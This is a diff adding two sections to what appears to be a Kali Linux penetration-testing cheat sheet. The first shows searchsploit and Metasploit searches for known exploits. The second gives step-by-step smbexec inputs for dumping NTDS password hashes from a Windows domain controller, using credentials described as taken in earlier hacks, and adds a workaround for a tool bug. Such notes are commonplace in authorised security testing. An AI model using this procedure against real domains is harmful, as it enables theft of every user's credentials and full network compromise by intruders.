@@ -560,13 +560,36 @@ unzip wce_v1_41beta_universal.zip
 # THIS SECTION IS INCOMPLETE!
 
 
+# SEARCHSPLOIT
+##############
+# Search a database of publically known vulnerabilities
+	# Automatically installed in Kali at:	cd /usr/share/exploitdb
+searchsploit windows 8	# Launch a search for all known exploits in an OS. Using "windows 8" as example - could also be iOS or Ubuntu, etc.
+	# Use `cat` to read the details if needed
+	# Further reading can be done at (default Kali URL bookmark):	https://www.exploit-db.com/
+msfconsole
+	search apache	# Use Metasploit to search for exploits based on any keyword (example: "apache")
 
 
-
-
-
-
-
+# ATTACKING DOMAIN CONTROLLERS
+##############################
+# NTDS.net	# The file used by domain controller database to store user hashes
+# This method will require admin privileges
+cd /opt/smbexec
+./smbexec.rb	# Begin the SMBExec exploit
+	3	# This option is for obtaining hashes
+	1	# To attack the domain controller
+	192.168.0.200	# Enter the IP address for the server running the comain controller. Using an example IP
+	Administrator	# Enter compromised credentials from previous hacks (using "Administrator:Password123" as example)
+	Password123		# Enter compromised credentials from previous hacks (using "Administrator:Password123" as example)
+	MYDOMAIN		# The domain name of the targeted server/network (using "MYDOMAIN" as example)
+	# Enter the drive letter to use (if asked). C:\Windows\TEMP	&	C:\Windows|NTDS 	are ok choices
+	y	# "Yes" - this will take a while
+	# If 0 domain hashes are dumped visit the provided txt log from the commads output.
+		# Review the log (might even be empty)
+		# To to the IP address folder (a folder with the target's IP for a name). "ntds.net" and "sys" files should exist. Open the text file with the target's IP for a file name.
+			# File may say:	"[!] Error! syshive not specified!"
+			# This is a bug in SMBExec. Fix it by visiting /opt/smbexec/lib/modules/hashdump/hashesdc.rb	
 
 
 
